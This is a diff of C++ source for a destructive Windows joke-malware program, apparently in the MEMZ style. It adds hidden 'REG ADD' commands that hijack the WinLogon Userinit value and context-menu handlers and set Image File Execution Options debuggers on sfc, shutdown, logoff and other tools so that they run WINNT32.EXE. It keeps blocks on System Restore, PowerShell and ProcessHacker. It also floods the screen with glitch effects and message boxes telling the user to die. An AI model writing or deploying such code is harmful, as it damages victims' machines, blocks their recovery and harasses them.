@@ -17,15 +17,11 @@
 #include <shlwapi.h> // Required for check file existence
 #include <cstdlib> // Required for no "ambiguous"
 #include <stdlib.h> // Same
-#include "data.h" // For Data
+#include <data.h> // For Data
 
-/*?*?*??*?*?*??*/
-#include <Tlhelp32.h>
-#include <Process.h>
 
 #pragma warning (disable: 4244) // For fucking Argument Warning for an unusable payload
 #pragma warning (disable: 4566) // For fucking Universal-Character-Name I know it cannot be represented in current code page.
-
 
 /* required for downloading files */
 #pragma comment (lib, "urlmon.lib")
@@ -375,27 +371,20 @@ void DestroyMBR() {
 
 /* first message box thread */
 DWORD WINAPI messageBoxThread(LPVOID parameter) {
-    while (1) {        
+    while (1) {
         MessageBoxW(NULL, L"AHHHHHHHHH WTF IS HAPPENING???", L"HELPPPPPP!!!!", MB_OK | MB_ICONWARNING);
         Sleep(3000);
         MessageBoxW(NULL, L"ur crazy, u ran unwanted virus", L"kill urself", MB_OK | MB_ICONWARNING);
         Sleep(3000);
-        if (genrand(0, 1) == 1) {
-            MessageBoxW(NULL, L"run away", L"run away", MB_OK | MB_ICONINFORMATION);
-            Sleep(1500);
-        }
-        else {
-            MessageBoxW(NULL, L"u need to die", L"ahahahahaah", MB_OK | MB_ICONQUESTION);
-            Sleep(1500);
-        }        
-        MessageBoxW(NULL, L"An error has ocurred but the error message cannot be settleved due to another error", L"Microsoft Windows", MB_OK | MB_ICONERROR);
+        MessageBoxW(NULL, L"u need to die", L"ahahahahaah", MB_OK | MB_ICONQUESTION);
+        Sleep(1500);
         MessageBoxW(NULL, L"run away", L"run away", MB_OK | MB_ICONINFORMATION);
         Sleep(1500);
-        MessageBoxW(NULL, L"Something Happened", L"Microsoft Windows", MB_OK | MB_ICONERROR);
+        MessageBoxW(NULL, L"lol haha xd", L"lol", MB_OK | MB_ICONERROR);
         Sleep(2000);
         MessageBoxW(NULL, L"Interactive sign-in process initialization has failed.\n\nPlease check the event log for details.", L"Sign-in process initialization failure", MB_OK | MB_ICONERROR);
         Sleep(1500);
-        MessageBoxW(NULL, L"Что-то произошло", L"Майкрософт Виндоус", MB_OK | MB_ICONERROR);
+        MessageBoxW(NULL, L"Call your technical support hehe", L"\n", MB_OK | MB_ICONERROR);
         Sleep(1500);
         MessageBoxW(NULL, L"don't press ok", L"ur crazy!!!!", MB_OK | MB_ICONINFORMATION);
         Sleep(1500);
@@ -404,9 +393,9 @@ DWORD WINAPI messageBoxThread(LPVOID parameter) {
         Sleep(1500);
         MessageBoxW(NULL, L"What the hell I have done?", L"WAAAAAAAAAAAAAH", MB_OK | MB_ICONWARNING);
         Sleep(1500);
-        MessageBoxW(NULL, L"The installation only supports Windows 98\r\nSetup will now exit", L"Setup®", MB_OK | MB_ICONWARNING);
+        MessageBoxW(NULL, L"³€ó²€‘ð²³‘²‘‘þ²þ", L"®³®²³¤þ³®dcededed", MB_OK | MB_ICONWARNING);
         Sleep(1500);
-        MessageBoxW(NULL, L"You do not have permission to view or edit the current permission settings for Documents, but you can take ownership or change auditing settings.", L"Security", MB_OK | MB_ICONWARNING);
+        MessageBoxW(NULL, L"You got the feeling, I know you are there", L"I am alone ;-;", MB_OK | MB_ICONWARNING);
         Sleep(1500);
     }
     return 0;
@@ -416,40 +405,24 @@ DWORD WINAPI messageBoxThread(LPVOID parameter) {
 DWORD WINAPI messageBox1Thread(LPVOID parameter) {
     HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
     while (1) {
-        if (genrand(0, 2) == 2) {
-            MessageBoxW(NULL, L".>██Ø██ê", L"ÿ", MB_OK | MB_ICONHAND);
-            Sleep(1500);
-        }
-        else if (genrand(0, 2) == 1) {
-            MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_OK | MB_ICONWARNING);
-            Sleep(1500);
-        }
-        else if (genrand(0, 2) == 0) {
-            MessageBoxW(NULL, L"Unexpected error: 21.", L"Cannot run program", MB_OK | MB_ICONWARNING);
-            Sleep(1500);
-        }
-        else {
-            MessageBoxW(NULL, L"The installation only supports Windows 98\r\nSetup will now exit", L"Setup®", MB_OK | MB_ICONWARNING);
-            Sleep(1500);
-        }
-        MessageBoxW(NULL, L"", L"Мой Компьютер", MB_OK | MB_ICONINFORMATION);
+        MessageBoxW(NULL, L"did you run it? why?", L"The Narrator", MB_OK | MB_ICONWARNING);
         Sleep(1500);
-        MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_OK | MB_ICONWARNING);
+        MessageBoxW(NULL, L"Still using this computer?\nlol, I am not MEMZ to ask you", L"lol - мемз пузз", MB_OK | MB_ICONWARNING);
         Sleep(1500);
         MessageBoxW(NULL, L"Stop clicking Ok", L"The Narrator", MB_OK | MB_ICONQUESTION);
         Sleep(1500);
         CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
         MessageBoxW(NULL, L"uR crazy bro u cannot run the unwanted virus", L"0_o", MB_OK | MB_ICONERROR);
         Sleep(1500);
-        MessageBoxW(NULL, L"The system is not fully installed. Please run setup again", L"Windows Message", MB_OK | MB_ICONERROR);
-        Sleep(1500);        
+        MessageBoxW(NULL, L"null is Null or Inexistent", L"True or false?", MB_OK | MB_ICONINFORMATION);
+        Sleep(1500);
         MessageBoxW(NULL, L"The application was unable to start correctly (0xc000029A) Click OK to close the application", L"unwanted.exe - Application Error", MB_OK | MB_ICONERROR);
         CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
         MessageBoxW(NULL, L"Ready to reinstall Windows?", L"®³€³¤³¤³€üþí¤íéé²é", MB_OK | MB_ICONWARNING);
         Sleep(1500);
-        MessageBoxW(NULL, L"An error has ocurred but the error message cannot be settleved due to another error", L"Microsoft Windows", MB_OK | MB_ICONERROR);
+        MessageBoxW(NULL, L"my pc is doing strange things plzz helppp", L"®abcdefg®dcededed", MB_OK | MB_ICONWARNING);
         Sleep(1500);
-        MessageBoxW(NULL, L"Unexpected error: 21.", L"Cannot run program", MB_OK | MB_ICONWARNING);
+        MessageBoxW(NULL, L"You got the feeling, I know you are there", L"I am alone ;-;", MB_OK | MB_ICONWARNING);
         Sleep(1500);
         CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
     }
@@ -459,38 +432,20 @@ DWORD WINAPI messageBox1Thread(LPVOID parameter) {
 DWORD WINAPI messageBox2Thread(LPVOID parameter) {
     HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
     while (1) {
-        if (genrand(0, 3) == 3) {
-            MessageBoxW(NULL, L"Error reading drive AB:", L"Error", MB_DEFBUTTON2 | MB_ABORTRETRYIGNORE | MB_ICONHAND);
-            Sleep(1500);
-        }
-        else if (genrand(0, 3) == 2) {
-            MessageBoxW(NULL, L"Your password must be at least 18770 characters and cannot repeat any of your previous 30689 passwords. Please type a different password. Type a password that meets these requirements in both text boxes", L"Change Password", MB_OK | MB_ICONWARNING);
-            Sleep(3000);
-        }
-        else if (genrand(0, 3) == 1) {
-            MessageBoxW(NULL, L"Insert AtR█¶█¼ disk in drive A:", L"Change Disk", MB_OK | MB_ICONHAND);
-            Sleep(1500);
-        }
-        else if (genrand(0, 3) == 0) {
-            MessageBoxW(NULL, L"Access Denied", L"Access Denied", MB_OK | MB_ICONHAND);
-            Sleep(1500);
-        }
-        else {
-            MessageBoxW(NULL, L"Idiot who press ok", L"lol", MB_OK | MB_ICONHAND);
-            Sleep(1500);
-        }
-        MessageBoxW(NULL, L"Error writing to Log\r\nSee log for more Information: µ:\\log.txt", L"Debug error", MB_OK | MB_ICONERROR);
+        MessageBoxW(NULL, L"anananananana", L"aaemnanandn", MB_OK | MB_ICONINFORMATION);
+        Sleep(3000);
+        MessageBoxW(NULL, L"lookk colorful bkgrn", L"ahahahahaah", MB_OK | MB_ICONERROR);
         CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
         Sleep(1500);
-        MessageBoxW(NULL, L"Windows Firewall can't change some of your settings.\r\nError code: 0x80070424", L"Windows Firewall", MB_OK | MB_ICONERROR);
+        MessageBoxW(NULL, L"die die die", L"i will kill everyone", MB_OK | MB_ICONERROR);
         Sleep(1500);
         CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
-        MessageBoxW(NULL, L"Device driver software was not installed.", L"Microsoft Windows", MB_OK | MB_ICONERROR);
+        MessageBoxW(NULL, L"aaaaaa\n  aaaaa", L"i will kill you first", MB_OK | MB_ICONINFORMATION);
         Sleep(2000);
         MessageBoxW(NULL, L"The sign-in process couldn't display security and sign-in\noptions when Ctrl+Alt+Delete was pressed. If Windows\ndoesn't respond, press Esc, or use the power switch to\nrestart.", L"Failure to display security and shut down options", MB_OK | MB_ICONERROR);
         Sleep(1500);
         CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
-        MessageBoxW(NULL, L"Something happened.", L"Microsoft Windows", MB_OK | MB_ICONINFORMATION);
+        MessageBoxW(NULL, L"game shift to shut\n alt & ctrl to move", L"space invaders", MB_OK | MB_ICONINFORMATION);
         Sleep(1500);
         CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
         CreateThread(NULL, 4096, &messageBox2Thread, NULL, NULL, NULL);
@@ -504,11 +459,12 @@ DWORD WINAPI urnidiotmsgbx(LPVOID parameter) {
     while (1) {
         MessageBoxW(NULL, L"You are an idiot!", L"You are an idiot!", MB_OK | MB_ICONWARNING);
         CreateThread(NULL, 4096, &messageBox2Thread, NULL, NULL, NULL);
-        MessageBoxW(NULL, L"The application falied to initialize properly (0xc00000005). Click OK to terminate the application", L"dwwin.exe - Application Error", MB_OK | MB_ICONERROR);
-        Sleep(1500); 
-        MessageBoxW(NULL, L"The system is not fully installed. Please run setup again", L"Windows Message", MB_OK | MB_ICONERROR);
+        MessageBoxW(NULL, L"\n", L"\n", MB_OK | MB_ICONERROR);
+        Sleep(100);
+        MessageBoxW(NULL, L"Ready to reinstall Windows?", L"®³€³¤³¤³€üþí¤íéé²é", MB_OK | MB_ICONWARNING);
         Sleep(1500);
-        MessageBoxW(NULL, L"The file or directory C:\\$Secure is corrupt and unreadable. Please run chkdsk utility.", L"Winlogon generic control dialog: winlogon.exe - Corrupt File", MB_OK | MB_ICONERROR);
+        Sleep(1500);
+        MessageBoxW(NULL, L"You got the feeling, I know you are there", L"I am alone ;-;", MB_OK | MB_ICONWARNING);
         Sleep(1500);
         CreateThread(NULL, 4096, &urnidiotmsgbx, NULL, NULL, NULL);
     }
@@ -529,10 +485,6 @@ int payloadMessageBox(int times, int runtime) {
     return 0;
 }
 
-void Fonts() {
-    RegDeleteKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Fonts"));
-}
-
 /* message boxes when windows die */
 DWORD WINAPI ripmessages(LPVOID parameter) {
     HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
@@ -544,7 +496,7 @@ DWORD WINAPI ripmessages(LPVOID parameter) {
 DWORD WINAPI STARTripmessages(LPVOID parameter) {
     while (1) {
         CreateThread(NULL, 4096, &ripmessages, NULL, NULL, NULL);
-        Sleep(250);
+        Sleep(100);
     }
 }
 
@@ -558,72 +510,80 @@ int DestroyURScreen() {
         HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
         SelectObject(hdc, brush);
         BitBlt(hdc, 0, y, sw, h, hdc, rand() % 1 - 1, y, SRCCOPY); // Mini effect blur to left bbbbbb
-        BitBlt(hdc, 0, y, sw, h, hdc, rand() % 1 - 1, y, SRCAND); // Mini effect blur to left bbbbbb
         PatBlt(hdc, -1, y, sw, h, PATINVERT);
         Sleep(rand() % 10);
-        BitBlt(hdc, rand() % (sw - rand() % 10), rand() % (sh - rand() % 10), rand() % (sw - rand() % 10), rand() % (sh - rand() % 10), hdc, rand() % (sw - rand() % 10), rand() % (sh - rand() % 10), SRCAND); // Pick random parts of screen and Invert it
-        BitBlt(hdc, rand() % (sw + rand() % 10), rand() % (sh + rand() % 10), rand() % (sw + rand() % 10), rand() % (sh + rand() % 10), hdc, rand() % (sw + rand() % 10), rand() % (sh + rand() % 10), SRCAND); // Pick random parts of screen and Invert it
-        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), SRCAND); // Pick random parts of screen and copy it
+        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), DSTINVERT); // Pick random parts of screen and Invert it
+        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), SRCCOPY); // Pick random parts of screen and copy it
         hwnd = GetForegroundWindow();
         hW = GetWindowDC(hwnd);
         hdc = GetDC(0);
         GetWindowRect(hwnd, &rekt);
         w = GetSystemMetrics(SM_CXSCREEN);
         h = GetSystemMetrics(SM_CYSCREEN); 
-        Pt[0].x = rekt.left + (rand() % 3);
-        Pt[0].y = rekt.top + (rand() % 3);
-        Pt[1].x = rekt.right + (rand() % 3);
-        Pt[1].y = rekt.top + (rand() % 3);
-        Pt[2].x = rekt.left + (rand() % 3);
-        Pt[2].y = rekt.bottom + (rand() % 3);
+        Pt[0].x = rekt.left + 1;
+        Pt[0].y = rekt.top + 1;
+        Pt[1].x = rekt.right + 1;
+        Pt[1].y = rekt.top + 1;
+        Pt[2].x = rekt.left + 1;
+        Pt[2].y = rekt.bottom + 1;
         PlgBlt(hdc, Pt, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0); // The falling window effect
 
 
     }
 }
 
-void RegCreateSet(HKEY hKey, LPCTSTR KeyLocation, LPCTSTR keyname, int Type, LPCTSTR Data, int size)
-{
-    HKEY key;
-    RegCreateKeyEx(hKey, KeyLocation, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &key, NULL);
 
-    if (RegOpenKeyEx(hKey, KeyLocation, 0, KEY_SET_VALUE | KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
+int FuckURScreen() {
+    int fur;
+    for (fur = 2000; fur >= 0; fur--)
     {
-        RegSetValueEx(key, keyname, 0, Type, (LPBYTE)Data, size);
-    }
-    else {
-        MessageBox(
-            NULL,
-            (LPCWSTR)L"ERROR ACCESSING REGISTRY", // Warning message box
-            (LPCWSTR)L"LOL",
-            MB_ICONERROR | MB_OK
-        );
-    }
+        int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 1);
+        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
+        SelectObject(hdc, brush);
+        BitBlt(hdc, 0, y, sw, h, hdc, rand() % 1 - 1, y, SRCCOPY);
+        PatBlt(hdc, -1, y, sw, h, PATINVERT);
+        Sleep(fur % 10);
+        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), DSTINVERT);
+        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), SRCCOPY);
+        hwnd = GetForegroundWindow();
+        hW = GetWindowDC(hwnd);
+        hdc = GetDC(0);
+        GetWindowRect(hwnd, &rekt);
+        w = GetSystemMetrics(SM_CXSCREEN);
+        h = GetSystemMetrics(SM_CYSCREEN);
+        Pt[0].x = rekt.left - 1;
+        Pt[0].y = rekt.top + 1;
+        Pt[1].x = rekt.right - 1;
+        Pt[1].y = rekt.top;
+        Pt[2].x = rekt.left - 1;
+        Pt[2].y = rekt.bottom + 1;
+        PlgBlt(hdc, Pt, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
+        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), SRCPAINT);
 
-    RegCloseKey(key);
+
+    }
+    return 0;
 }
 
-void RegSetVal(HKEY hKey, LPCTSTR KeyLocation, LPCTSTR keyname, LPCTSTR Data, int size)
-{
-    HKEY key;
 
-    if (RegOpenKeyEx(hKey, KeyLocation, 0, KEY_SET_VALUE | KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
+int FuckURScreen2() {
+
+
+    while (TRUE)
     {
-        RegSetValueEx(key, keyname, 0, REG_SZ, (LPBYTE)Data, size);
-
+        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), BLACKNESS);
+        Sleep(500);
+        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), WHITENESS);
+        Sleep(500);
     }
-    else {
-        MessageBox(
-            NULL,
-            (LPCWSTR)L"ERROR ACCESSING REGISTRY 2", // Warning message box
-            (LPCWSTR)L"LOL",
-            MB_ICONERROR | MB_OK
-        );
-    }
-
-    RegCloseKey(key);
 }
 
+int SmallScreenEffect() {
+    while (1) {
+        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), DSTINVERT);
+        Sleep(100);
+    }
+}
 
 
 void CreateTimeDate() {
@@ -722,7 +682,7 @@ void DisableLogonUI() {
     BYTE* data5 = (BYTE*)&dwValue5;
     RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\logonui.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle5, NULL);
     RegSetValueEx(regHandle5, TEXT("Debugger"), 0, REG_SZ, data5, sizeof(DWORD));
-    RegCloseKey(regHandle5);    
+    RegCloseKey(regHandle5);
 }
 
 void DisableRunDLL32() {
@@ -772,10 +732,6 @@ void DisableLogonOptions() {
 
 }
 
-void testreg() {
-    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡þ∞á£Ω▒δïñ_æåí\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
-}
-
 void DisablePowerOptions() {
     
 
@@ -788,30 +744,28 @@ void DisablePowerOptions() {
 
     //system("REG ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\u0022 /v \u0022Shell\u0022 /t REG_SZ /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f");
 
-    // sample:  RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"), TEXT("Debugger"), REG_SZ, TEXT(""), sizeof(TEXT("")));
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKCR\\*\\shell\\_¡þ∞á£Ω▒δïñ_æåí\\command\u0022 /ve /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKCR\\*\\shell\\_¡τµ░ùáΣ╕Çτ╕ùáΣ\\command\u0022 /ve /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKCR\\*\\shell\\_¡∞á£Ω▒░ φòá╕Ç╕\\command\u0022 /ve /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKCR\\*\\shell\\_¡¾4~¡∞á£Ω▒░φòá\\command\u0022 /ve /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKCR\\*\\shell\\_¡þ^&*|@²áó_æåí\\command\u0022 /ve /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKCR\\*\\shell\\_¡þα╖àα╢▒α╖£α╖É\\command\u0022 /ve /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);
 
-    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡þ∞á£Ω▒δïñ_æåí\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
-    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡τµ░ùáΣ╕Çτ╕ùáΣ\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
-    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡∞á£Ω▒░ φòá╕Ç╕\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
-    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡¾4~¡∞á£Ω▒░φòá\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
-    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡þ^&*|@²áó_æåí\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
-    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡þα╖àα╢▒α╖£α╖É\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\u0022 /v \u0022Userinit\u0022 /t REG_SZ /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\u0022 /v \u0022Userinit\u0022 /t REG_SZ /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);
 
-    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
-    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
 
-    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplore.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
-    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\logoff.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
-    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sfc.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
-    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\shutdown.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplore.exe\u0022 /v Debugger /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\logoff.exe\u0022 /v Debugger /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sfc.exe\u0022 /v Debugger /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\shutdown.exe\u0022 /v Debugger /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022", NULL, SW_HIDE);
 
-    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\IOBITUnlocker.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title YOU ARE TRYING TO KILL ME HUH??? &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run IOBITUnlocker.exe &pause >nul"), sizeof(TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title YOU ARE TRYING TO KILL ME HUH??? &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run IOBITUnlocker.exe &pause >nul")));
-    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rstrui.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Windows\\System32\\cmd.exe /c color 0a & title System Restore &  echo Nice try &pause >nul"), sizeof(TEXT("C:\\Windows\\System32\\cmd.exe /c color 0a & title System Restore &  echo Nice try &pause >nul")));
-    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ProcessHacker.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title PROCESSHACKER.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run PROCESSHACKER.EXE &pause >nul"), sizeof(TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title PROCESSHACKER.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run PROCESSHACKER.EXE &pause >nul")));
-    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Powershell.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Windows\\System32\\cmd.exe /c title POWERSHELL.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run POWERSHELL &pause >nul"), sizeof(TEXT("C:\\Windows\\System32\\cmd.exe /c title POWERSHELL.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run POWERSHELL &pause >nul")));
-    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title UTILMAN.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE &pause >nul"), sizeof(TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title UTILMAN.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE &pause >nul")));
-    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SetHC.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title SETHC.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MIN &pause >nul"), sizeof(TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title SETHC.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MIN &pause >nul")));
-
